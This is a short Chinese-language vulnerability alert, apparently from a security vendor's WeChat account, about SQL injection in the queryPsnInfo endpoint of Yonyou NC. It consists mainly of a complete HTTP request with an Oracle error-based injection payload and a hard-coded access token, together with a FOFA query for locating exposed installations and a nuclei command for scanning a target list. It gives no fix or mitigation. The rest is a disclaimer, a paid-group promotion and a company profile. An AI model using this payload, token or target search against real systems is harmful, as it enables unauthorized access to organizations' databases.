#  漏洞预警 用友 NC querypsninfo SQL注入漏洞   
by 融云安全-sm  融云攻防实验室   2024-08-04 22:28  
  
**0x01 阅读须知**  
  
**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
  
**0x02 漏洞描述**  
  
用友 NC querypsninfo 存在SQL注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49xgJFvErD3n6sdic4cwRicOMavmfoHRgKqX6SrUEH5m6PeLqBDPk6s22FkrPhlSYWTMOAwsXibicF0aXQ/640?wx_fmt=png&from=appmsg "")  
  
**0x03 漏洞复现**  
  
**fofa-qeury: title="YONYOU NC"**  
  
1.执行poc进行sql注入，得到数据库信息  
```
GET /ncchr/pm/obj/queryPsnInfo?staffid=1%27+AND+1754%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%281754%3D1754%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29--+2222 HTTP/1.1
User-Agent: Mozilla/5.0 
Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
Host:
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49xgJFvErD3n6sdic4cwRicOMa2cAFR7j8E4s55CWticV1U0H8WAcczyyD46aUwBXUOtoaHrcVibnOFnmw/640?wx_fmt=png&from=appmsg "")  
  
2.nuclei验证脚本已发布于知识星球  
```
nuclei.exe -t yongyou-nc-querypsninfo-sqli.yaml -l subs.txt -stats
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49xgJFvErD3n6sdic4cwRicOMahTicDasNibnCa8AHzV4B7D6IN4RnibUj87icum8vp849BVqribicjD7ZVSfg/640?wx_fmt=png&from=appmsg "")  
  
**加入星球请扫描下方二维码，更多精，敬请期待！**  
  
👇👇👇  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
**星球亮点：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49wOibwjXDprJGvrk2gbZcTcOtD9ztDD6NyMvkNhUuMN8yPWicCI7MjOWvTQibLgQsXUqBPY0jPwHzQ6A/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
  
**0x04 公司简介**  
  
江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
    公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
  
**编制：sm**  
  
**审核：fjh**  
  
**审核：Dog**  
  
****  
**1个1朵********5毛钱**  
  
**天天搬砖的小M**  
  
**能不能吃顿好的**  
  
**就看你们的啦**  
  
****  
  
  
